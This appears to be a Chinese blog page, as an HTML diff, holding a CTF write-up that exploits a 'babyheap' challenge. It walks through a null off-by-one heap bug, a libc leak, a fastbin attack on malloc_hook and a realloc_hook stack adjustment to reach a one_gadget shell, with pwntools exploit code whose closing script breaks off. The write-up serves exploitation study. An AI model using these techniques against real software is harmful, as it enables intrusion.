@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，检查一下程序的保护机制,保护全开   然后用IDA分析，发现在创建并读入数据时，有一个null off by one漏洞   我们所能利用的也就是这个漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Babyheap">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/20/babyheap/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，检查一下程序的保护机制,保护全开   然后用IDA分析，发现在创建并读入数据时，有一个null off by one漏洞   我们所能利用的也就是这个漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image11.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image12.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image13.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image14.JPG">
+<meta property="article:published_time" content="2019-11-20T14:52:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T09:22:22.941Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="unsorted bin">
+<meta property="article:tag" content="fastbin">
+<meta property="article:tag" content="malloc_hook">
+<meta property="article:tag" content="off by one">
+<meta property="article:tag" content="realloc_hook">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/20/babyheap/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/20/babyheap/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Babyheap | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/20/babyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Babyheap
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-20 22:52:50" itemprop="dateCreated datePublished" datetime="2019-11-20T22:52:50+08:00">2019-11-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 17:22:22" itemprop="dateModified" datetime="2025-06-21T17:22:22+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，检查一下程序的保护机制,保护全开</p>
+<img src="/ha1vk/2019/11/20/babyheap/image1.JPG" class="">
+
+<p>然后用IDA分析，发现在创建并读入数据时，有一个<strong>null off by one漏洞</strong></p>
+<img src="/ha1vk/2019/11/20/babyheap/image2.JPG" class="">
+
+<p>我们所能利用的也就是这个漏洞</p>
+<p>第一步仍然是想办法泄露一些关键地址</p>
+<p>由于可以溢出一字节的0数据到下一个chunk，以前，我们阅读glibc内存管理，知道了**chunk空间的共用情况，也就是[下一个的chunk的prev_size域给当前chunk当做数据域使用]{.mark}，这种情况只出现在malloc的大小为8的奇数倍(32为4的奇数倍)的情况。考虑到unsorted bin的表头会有libc中的[main_arena+88的地址，]{.mark}**因此我们首先肯定得创建一些unsorted bin。</p>
+<p>现在，假如我们创建了几个堆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk0  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line"><span class="comment">#chunk1  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line"><span class="comment">#chunk2  </span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x68</span>)  </span><br><span class="line"><span class="comment">#chunk3  </span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x68</span>)  </span><br><span class="line"><span class="comment">#chunk4  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x100</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>堆布局如下</p>
+<img src="/ha1vk/2019/11/20/babyheap/1.png" class="" title="1.png">
+
+<p>其中,chunk0、chunk1、chunk4大小在unsorted bin范围，当他们free后就进入了unsorted bin，并且相邻的chunk会进行unlink合并。既然能够溢出一字节0数据，那么**[假如我们从chunk3中溢出，覆盖chunk4的size域的低一字节为0，那么就标志了chunk4的前一chunk处于空闲状态]{.mark}<strong>，那么，</strong>[当我们free chunk4的时候，chunk4就会与它的前一chunk合并]{.mark}**，而它的前一chunk是如何取到的呢，看看glibc源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span>  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))  </span></span><br></pre></td></tr></table></figure>
+
+<p>也就是依赖于prev_size，由于chunk3的大小为0x68，是8的奇数倍，因此它会把chunk4的prev_size域作为数据域，因此,prev_size我们可以自己指定大小</p>
+<p>假如，我们在chunk3中，<strong>[把chunk4的prev_size设置为(0x110+0x110+0x70+0x70 &#x3D; 0x300)，然后覆盖chunk4的size低1字节为0]{.mark}</strong>,那么,当我们delete(4)时，就会合并chunk4和chunk4-0x300处的chunk，也就是<strong>会合并chunk0、chunk1、chunk2、chunk3、chunk4</strong></p>
+<p>由于**[没有编辑功能，我们只能delete(3)后再重新create分配到那个位置，同时构造payload溢出到chunk4]{.mark}**</p>
+<p>由于合并时,unlink会报错，因此，我们在事先，应该delete(0)，让chunk0加入unsorted bin中。delete(2)用于将chunk2放入fastbin，供后续fastbin attack使用，<strong>[注意，必需在合并chunk0、chunk1、chunk2、chunk3、chunk4之前让chunk2加入fastbin]{.mark}</strong>，合并后再delete(2)不能让chunk2加入到fastbin中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk2用于放入fastbin  </span></span><br><span class="line">delete(<span class="number">2</span>)  </span><br><span class="line"><span class="comment">#chunk3用于溢出  </span></span><br><span class="line">delete(<span class="number">3</span>)  </span><br><span class="line"><span class="comment">#chunk0用于加入unsorted bin，并且让main_arena+88指针存入fd和bk  </span></span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#把chunk3申请回来，并off by one null到chunk4,覆盖chunk4的低1字节为0  </span></span><br><span class="line">payload = <span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>  </span><br><span class="line"><span class="comment">#prev_size  </span></span><br><span class="line">payload += p64(<span class="number">0x300</span>)  </span><br><span class="line">create(<span class="number">0x68</span>,payload)  </span><br></pre></td></tr></table></figure>
+
+<p>现在堆的布局是这样子的</p>
+<img src="/ha1vk/2019/11/20/babyheap/2.png" class="" title="2.png">
+
+<p>接下来，我们<strong>delete(4)，chunk0~chunk4发生合并，合并后chunk0作为unsorted bin表头fd、bk值仍然指向main_arena+88</strong></p>
+<p>然而，当我们实际操作时,delete(4)时出现了报错</p>
+<img src="/ha1vk/2019/11/20/babyheap/image3.JPG" class="">
+
+<p>我们看看glibc源码</p>
+<img src="/ha1vk/2019/11/20/babyheap/image4.JPG" class="">
+
+<img src="/ha1vk/2019/11/20/babyheap/image5.JPG" class="">
+
+<img src="/ha1vk/2019/11/20/babyheap/image6.JPG" class="">
+
+<p>还记得<strong>chunk4的size被我们覆盖成了0x100吗，原本是0x111的</strong>，也就是说，<strong>[现在取到的nextsize是chunk4数据域里偏移0x90+8处的数据，而不是下一个chunk的size，]{.mark}</strong></p>
+<p>为了避免后续的其他类似的错误，我们把chunk4留下的那(0x110-0x100&#x3D;0x10的空间伪装成一个chunk5)</p>
+<p>所以，<strong>在一开始创建chunk4的应该应该这样写</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk4的创建，后0x10空间用于伪装出一个假chunk5  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;e&#x27;</span>*(<span class="number">0x100</span>-<span class="number">16</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0x11</span>))  </span><br></pre></td></tr></table></figure>
+
+<p>现在，我们再查看堆的布局情况(pwndbg attach 到pid上，然后输入bin命令)</p>
+<img src="/ha1vk/2019/11/20/babyheap/image7.JPG" class="">
+
+<p>现在发现，fastbin里的那个就是我们的chunk2，待会fastbin attack用到</p>
+<p>而unsorted bin里就一个节点(chunk0)，中间那个是main_arena+88，它们组成了双向链表</p>
+<p>现在，假如我们create(0x100)，那么glibc就会从unsorted bin中的表头(chunk0)处开始，切割出0x110的空间给我们，然后表头变成了chunk0+0x110</p>
+<img src="/ha1vk/2019/11/20/babyheap/image8.JPG" class="">
+
+<p>并且chunk0+0x110处开始作为一个chunk,<strong>[它的fd和bk会被设置为main_arena+88]{.mark}</strong>，</p>
+<p>但是，你发现了什么，<strong>chunk0 + 0x110不就是chunk1吗，还记得[chunk1并没有被我们free，它只是参与了合并，]{.mark}因此它的指针存在于数组中，并没有被清0</strong></p>
+<img src="/ha1vk/2019/11/20/babyheap/image9.JPG" class="">
+
+<p>那么，当我们show()的时候，就会把chunk1的fd值打印出来，从而泄露了main_arena+88的地址</p>
+<img src="/ha1vk/2019/11/20/babyheap/image10.JPG" class="">
+
+<p><strong>[由于main_arena+88和malloc_hook物理位置上在同一页，并且靠的很近，因此，它们的地址只有后三位不一样]{.mark}</strong>，那么我们就能计算出malloc_hook的地址，然后就能计算出libc基地址，从而获取gadget的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#申请掉chunk0后，main_area+88指针放到了chunk1的fd和bk处  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">  </span><br><span class="line">show()  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;1 : &#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">main_area_88 = u64(sh.recvuntil(<span class="string">&#x27; &#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#低字节覆盖获得malloc_hook的地址  </span></span><br><span class="line">malloc_hook_addr = (main_area_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_s_hook &amp; <span class="number">0xFFF</span>)  </span><br><span class="line">libc_base = malloc_hook_addr - malloc_s_hook  </span><br><span class="line">realloc_addr = libc_base +  realloc_s  </span><br><span class="line">gadget_addr = libc_base + gadget  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;malloc_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(malloc_hook_addr)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;realloc_addr=&#x27;</span>,<span class="built_in">hex</span>(realloc_addr)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;gadget_addr=&#x27;</span>,<span class="built_in">hex</span>(gadget_addr)  </span><br></pre></td></tr></table></figure>
+
+<p>现在一些需要的信息我们都得到了，我们接下来是想办法把gadget的地址写入到malloc_hook里，这样当程序再次malloc时，便会触发gadget，从而get shell</p>
+<p>现在我们用fastbin attack，fastbin attack能让我们把堆申请到malloc_hook-0x23处，知道我们的chunk2为什么申请时设置为0x68的大小吗，因为实际创建的大小是0x70，而malloc_hook-0x23处偏移0x8处的数据为0x7F，与0x70大小相当</p>
+<img src="/ha1vk/2019/11/20/babyheap/image11.JPG" class="">
+
+<p>fastbin只检查chunk的size域是否符合要求，因此，我们的chunk2的size要与它大小相当，这样，我们<strong>想办法把chunk2的fd指向malloc_hook-0x23这个假chunk处，这样，chunk2和malloc_hook-0x23处构成了单向链表</strong>，<strong>当我们第二次申请0x68大小的堆时，就会申请到malloc_hook-0x23处</strong>，更多详细知识见我的博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/103057937">https://blog.csdn.net/seaaseesa/article/details/103057937</a></p>
+<h2 id="那么如何才能修改到chunk2的fd域呢？"><a href="#那么如何才能修改到chunk2的fd域呢？" class="headerlink" title="那么如何才能修改到chunk2的fd域呢？"></a>那么如何才能修改到chunk2的fd域呢？</h2><p>我们可以利用**[堆重叠]{.mark}**</p>
+<p>假如我们create(0x118,payload),由于之前已经create(0x100)过一次，那么这次chunk分配的范围就是chunk0 + 0x110 ~ chunk0+0x110+0x128也就是chunk1~chunk2+0x18处，正好可以把chunk2的fd给覆盖了，如果觉得麻烦，直接申请大点，不用这么精确</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#现在用fastbin attack  </span></span><br><span class="line"><span class="comment">#堆重叠，修改chunk2的fd指针  </span></span><br><span class="line">payload = <span class="string">&#x27;g&#x27;</span>*<span class="number">0x100</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)  </span><br><span class="line">payload += p64(malloc_hook_addr-<span class="number">0x23</span>)  </span><br><span class="line">create(<span class="number">0x118</span>,payload)  </span><br></pre></td></tr></table></figure>
+
+<p>现在，我们再看看堆的布局</p>
+<img src="/ha1vk/2019/11/20/babyheap/image12.JPG" class="">
+
+<p>malloc_hook-0x23处成功链入fastbin，那么当我们第二次申请0x68大小空间时就能申请到这里</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一次申请  </span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;h&#x27;</span>*<span class="number">0x68</span>)  </span><br><span class="line"><span class="comment">#修改malloc_hook  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(gadget_addr)  </span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="comment">#第二次申请  </span></span><br><span class="line">create(<span class="number">0x68</span>,payload)  </span><br></pre></td></tr></table></figure>
+
+<p>这样，看似已经可以了，我们只需再触发一次malloc，即可getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#触发malloc_hook getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Your choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)<span class="string">&#x27;&#x27;&#x27;  </span></span><br></pre></td></tr></table></figure>
+
+<p>然而，gadget变得不可用,执行不成功</p>
+<img src="/ha1vk/2019/11/20/babyheap/image13.JPG" class="">
+
+<p><em><strong>[以下两段来自看雪论坛]{.mark}</strong></em><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-246786.htm">https://bbs.pediy.com/thread-246786.htm</a></p>
+<p><em><strong>[有些情况下one_gadget因为栈环境原因全部都不可用，这时可以通过realloc_hook来调整堆栈环境使one_gadget可用。realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。realloc_hook同malloc_hook相邻，故可通过fastbin attack一同修改两个值。]{.mark}</strong></em></p>
+<p>如何利用realloc_hook来调整栈环境呢？</p>
+<p>观察realloc函数的流程push寄存器，最后全部pop出来跳转至realloc_hook的值。</p>
+<p><em><strong>[因此可以将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。]{.mark}</strong></em></p>
+<p>经过测试，我们只需在realloc函数地址向下偏移2就可以使栈环境正常</p>
+<img src="/ha1vk/2019/11/20/babyheap/image14.JPG" class="">
+
+<p>于是，我们修改后的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改realloc_hook和malloc_hook  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0xB</span> + p64(gadget_addr) + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0xB</span>-<span class="number">0x8</span>)  </span><br><span class="line"><span class="comment">#用于堆栈调整  </span></span><br><span class="line">payload += p64(realloc_addr + <span class="number">2</span>)  </span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="comment">#第二次申请  </span></span><br><span class="line">create(<span class="number">0x68</span>,payload)  </span><br></pre></td></tr></table></figure>
+
+<p>最终，我们写出了如下的exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> one_gadget <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">sh = process(<span class="string">&#x27;./timu&#x27;</span>)  </span><br><span class="line"><span class="comment">#sh = remote(&#x27;111.198.29.45&#x27;,57745)  </span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>  </span><br><span class="line">libc = ELF(libc_path)  </span><br><span class="line"><span class="comment">#malloc_hook的静态地址  </span></span><br><span class="line">malloc_s_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]  </span><br><span class="line"><span class="comment">#realloc函数的静态地址  </span></span><br><span class="line">realloc_s = libc.sym[<span class="string">&#x27;realloc&#x27;</span>]  </span><br><span class="line"><span class="comment">#gadger  </span></span><br><span class="line">g = generate_one_gadget(libc_path)  </span><br><span class="line">gadget = g.<span class="built_in">next</span>()  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#sh = remote(&#x27;111.198.29.45&#x27;,41803)  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Data:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title 